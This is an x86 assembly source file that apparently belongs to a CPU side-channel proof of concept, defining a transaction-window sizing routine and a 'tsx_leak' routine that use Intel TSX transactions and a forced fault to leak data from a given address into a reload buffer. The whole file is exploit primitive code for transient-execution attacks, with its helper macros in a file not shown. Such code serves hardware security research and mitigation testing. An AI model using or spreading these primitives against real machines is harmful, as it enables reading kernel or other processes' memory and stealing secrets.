%include "common.S"

section .text
default rel

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; tsx_win_size(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global tsx_win_size
tsx_win_size:

    SERIALIZE

    xbegin  tsx_win_size_fail
    xor     rax, rax
    mov     rax, [rax]
    LOADS   rdi
    xend

tsx_win_size_fail:
    ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; tsx_leak(uint8_t *reload_buffer, uint8_t *addr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global tsx_leak
tsx_leak:
    xbegin  tsx_leak_fail
    LEAK    rdi, rsi
    xor     rax, rax
    mov     rax, [rax]
    xend

tsx_leak_fail:
    ret
